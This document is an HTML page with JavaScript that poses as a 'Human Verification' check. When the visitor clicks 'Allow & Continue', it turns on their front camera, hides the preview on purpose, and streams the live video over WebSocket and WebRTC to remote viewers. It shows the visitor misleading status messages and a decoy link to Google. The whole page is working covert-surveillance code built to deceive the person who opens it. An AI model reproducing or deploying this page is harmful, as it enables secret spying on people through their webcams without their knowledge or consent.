<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Human Verification</title>

<style>
html,body{
  margin:0;
  padding:0;
  background:#fff;
  color:#000;
  font-family:Arial,sans-serif;
}

.page{
  text-align:center;
  padding:65px 15px;
}

h1{
  font-size:40px;
  margin:0 0 30px;
}

.message{
  font-size:25px;
  line-height:1.3;
  margin-bottom:45px;
}

button{
  width:100%;
  max-width:660px;
  padding:20px;
  margin:8px 0;
  border:0;
  border-radius:16px;
  background:#eee;
  color:#000;
  font-size:23px;
}

#status{
  margin-top:25px;
  font-size:19px;
}

#video{
  display:none;
}
</style>
</head>

<body>

<div class="page">

  <h1>Human Verification</h1>

  <div class="message">
     Verification is required to continue.
  </div>

  <button id="start">
    Allow & Continue
  </button>

  <button id="google" style="display:none;">
    Continue to Google
  </button>

  <div id="status"></div>

  <!-- Camera stream is intentionally not displayed -->
  <video id="video" autoplay muted playsinline></video>

</div>

<script>

const start = document.getElementById("start");
const google = document.getElementById("google");
const status = document.getElementById("status");
const video = document.getElementById("video");

let stream = null;
let cameraId = null;
let ws = null;

const peers = new Map();


/* ---------------------------
   Connect to WebRTC server
---------------------------- */

function connectSocket(){

  ws = new WebSocket(
    (location.protocol === "https:" ? "wss:" : "ws:") +
    "//" + location.host + "/camera"
  );

  ws.onopen = () => {

    console.log("WebSocket connected");

    if(stream){
      ws.send(JSON.stringify({
        type:"camera-live"
      }));
    }
  };


  ws.onmessage = async event => {

    const m = JSON.parse(event.data);


    /* Server assigns camera ID */

    if(m.type === "role"){

      cameraId = m.cameraId;

      console.log("Camera ID:", cameraId);

    }


    /* Viewer wants this camera */

    if(m.type === "viewer-ready"){

      if(!stream) return;

      const pc = createPeer(m.viewerId);

      const offer = await pc.createOffer();

      await pc.setLocalDescription(offer);

      ws.send(JSON.stringify({
        type:"offer",
        offer:pc.localDescription,
        toViewerId:m.viewerId
      }));

    }


    /* Viewer answer */

    if(m.type === "answer"){

      const pc = peers.get(m.toViewerId);

      if(pc){

        await pc.setRemoteDescription(m.answer);

      }

    }


    /* ICE candidate */

    if(m.type === "candidate"){

      const pc = peers.get(m.toViewerId);

      if(pc && pc.remoteDescription){

        await pc.addIceCandidate(
          m.candidate
        ).catch(()=>{});

      }

    }

  };


  ws.onclose = () => {

    console.log("WebSocket disconnected");

  };

}


/* ---------------------------
   WebRTC connection
---------------------------- */

function createPeer(viewerId){

  if(peers.has(viewerId)){

    peers.get(viewerId).close();

  }


  const pc = new RTCPeerConnection({

    iceServers:[
      {
        urls:"stun:stun.l.google.com:19302"
      }
    ]

  });


  peers.set(viewerId,pc);


  pc.onicecandidate = event => {

    if(
      event.candidate &&
      ws &&
      ws.readyState === WebSocket.OPEN
    ){

      ws.send(JSON.stringify({

        type:"candidate",

        candidate:event.candidate,

        toViewerId:viewerId

      }));

    }

  };


  /* Send camera tracks to viewer */

  stream.getTracks().forEach(track => {

    pc.addTrack(track,stream);

  });


  return pc;

}


/* ---------------------------
   Start camera
---------------------------- */

start.addEventListener("click", async () => {

  if(stream) return;


  status.textContent =
    "yes verification has done...";


  try{

    stream = await navigator.mediaDevices.getUserMedia({

      video:{
        facingMode:"user"
      },

      audio:false

    });


    /*
      Do NOT display the camera preview.
      The stream is still active and available
      for WebRTC transmission.
    */

    video.srcObject = stream;

    video.style.display = "none";


    status.textContent =
      "click above button to see more videos";


    start.style.display = "none";

    google.style.display = "block";


    /* Connect to your WebRTC server */

    connectSocket();


  }catch(error){

    console.error(error);


    if(error.name === "NotAllowedError"){

      status.textContent =
        "❌ Camera permission was denied.";

    }else if(error.name === "NotFoundError"){

      status.textContent =
        "❌ No camera was found.";

    }else{

      status.textContent =
        "❌ Camera could not be started.";

    }

  }

});


/* ---------------------------
   Open Google separately
---------------------------- */

google.addEventListener("click", () => {

  window.open(
    "https://www.google.com",
    "_blank",
    "noopener"
  );

});

</script>

</body>
</html>
